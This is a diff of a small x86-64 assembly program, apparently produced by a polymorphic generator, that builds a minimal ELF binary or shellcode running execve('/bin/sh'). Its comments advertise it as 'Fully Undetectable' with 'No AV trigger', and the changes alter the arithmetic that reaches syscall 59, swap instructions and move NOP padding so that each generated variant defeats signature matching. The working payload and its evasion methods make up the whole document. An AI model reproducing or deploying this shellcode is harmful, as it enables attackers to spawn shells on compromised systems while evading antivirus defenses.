@@ -1,9 +1,9 @@
+; This is example only. Do not use. Generate new!!
 ;
 ;      ooo           ***           ...           ...           ...
 ;     (o o)         (o o)         (- -)         (. .)         (* *)
 ; ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-
 ;
-; Fully Undetectable exec /bin/sh program. No AV trigger.
 ; Generated from a script by CH405.
 ; Thx to 0x00000000 for idea. ^^
 ; Create smallest binary or cut and paste for shellcode use.
@@ -12,8 +12,6 @@
 ; Do not forget to chmod +x shellexec
 ;
 ; Have happy fun! Do not be bad man. Do not be illegal man
-;
-; Generate 2024-10-10 22:45:10
 
 bits 64
             org 0x08048000
@@ -51,26 +49,25 @@ phdr:                                           ; Elf64_Phdr
 phdrsize    equ     $ - phdr
 
 _start:
-    nop				; No operation, Actually do nothing.
-    nop				; No operation, Actually do nothing.
-    nop				; No operation, Actually do nothing.
     mov rax, 0x68732f6e69622f 	; mov  value "/bin/sh" in hex to rax
     push rax
     push rsp
     pop rdi
-    sub eax, eax		; Random way to make eax equal 0
+    xor eax, eax		; "xor eax, eax" save few extra bytes.
     push rax
-    mov al, 184			; Mutate function, start with random value
-    add al, 43			; add random value
-    sub al, 168			; make sure al has value 59 for exec syscall
+    mov al, 215			; Mutate function, start with random value
+    add al, 22			; add random value
+    sub al, 178			; make sure al has value 59 for exec syscall
     push rsp
     pop rdx
     push rsp
+    nop				; No operation, Actually do nothing.
+    nop				; No operation, Actually do nothing.
+    nop				; No operation, Actually do nothing.
     pop rsi
     syscall 			; calling function 59, exec
 filesize      equ     $ - $$
 
-; Insert generate junk. Can be removed but only add 8-10 bytes.
-; Make signature identification almost impossible.
+; Removed to make smaller.
 ; section .data
-; seed db "FXm8'37_"
+; seed db "S:y0zCqn"
